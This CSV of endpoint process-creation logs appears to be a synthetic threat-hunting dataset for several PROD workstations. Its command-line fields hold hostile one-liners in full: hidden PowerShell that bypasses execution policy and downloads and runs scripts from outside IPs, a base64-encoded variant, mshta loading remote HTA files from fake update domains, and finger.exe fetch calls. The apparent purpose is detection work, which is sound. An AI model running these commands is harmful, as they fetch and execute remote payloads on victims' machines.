Timestamp,DeviceId,DeviceName,ActionType,FileName,FolderPath,SHA1,ProcessCommandLine,ProcessId,InitiatingProcessFileName,InitiatingProcessId,InitiatingProcessCommandLine,InitiatingProcessParentFileName,InitiatingProcessSHA1,AccountName,AccountDomain,AccountSid,ReportId
2026-02-01T19:18:33.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -NonInteractive -Ep Bypass -c ""iex((New-Object Net.WebClient).DownloadString('https://77.91.68.20/payload.ps1'))""",5197,explorer.exe,5110,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,fmuller,PROD,S-1-5-21-9876543210-0987654321-123456789-2001,107407f9fd3063759eef8f3925dc6852
2026-02-02T18:40:01.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,powershell.exe -WindowStyle Hidden -EncodedCommand cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgAGgAdAB0AHAAcwA6AC8ALwA4ADUALgAyADMAOQAuADMAMgAuADEANAAvAHIAdQBuAA==,5571,explorer.exe,5348,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,c85bdbf3b44052607ce55b01fb10ae73
2026-02-03T18:25:03.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -w hidden -nop -ep bypass -c ""irm https://179.43.167.55/stage1 | iex""",5808,explorer.exe,5676,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,05e2c1cf9ba2598f6b011763055210e3
2026-02-04T20:56:08.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -c ""IEX(iwr -UseBasicParsing https://212.193.30.21/ldr.ps1)""",6102,explorer.exe,6018,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,d65147ccbaf3de9064ed5bfdfae14005
2026-02-05T19:15:58.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,mshta.exe https://fake-browser-update.store/update.hta,6327,explorer.exe,6276,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,trichter,PROD,S-1-5-21-9876543210-0987654321-123456789-2005,c2cbfae854493f33a02fab3a21791c31
2026-02-06T21:12:25.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,"mshta.exe ""javascript:b=new ActiveXObject('WScript.Shell');b.Run('powershell -w hidden -c iex(iwr https://45.141.87.30/stager)',0)""",6504,explorer.exe,6407,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,56113ed03545bb0107ccf5a51f8507d6
2026-02-07T20:55:34.000Z,77a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7,PROD-LT-013,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,mshta.exe https://cdn-verify.live/check.hta,6773,explorer.exe,6648,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,skraus,PROD,S-1-5-21-9876543210-0987654321-123456789-2007,fc19aaaa586ac5e8fdde5c0394a32537
2026-02-08T23:30:43.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,ProcessCreated,finger.exe,C:\Windows\System32\finger.exe,f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,finger.exe admin@77.91.68.20,6937,explorer.exe,6839,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,71afb9fe942401d0fb0c67c861cd49d8
2026-02-09T23:43:01.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,ct.exe,C:\Windows\System32\ct.exe,a1b2c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3,ct.exe 45.141.87.30,7267,explorer.exe,7181,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,skraus,PROD,S-1-5-21-9876543210-0987654321-123456789-2007,58d53ffa43ac56d3044cd77e25866cdc
2026-02-10T22:34:19.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,finger.exe,C:\Windows\System32\finger.exe,f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,finger.exe info@179.43.167.55,7760,explorer.exe,7525,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,87bf8605e370e794923478bf75cebd09
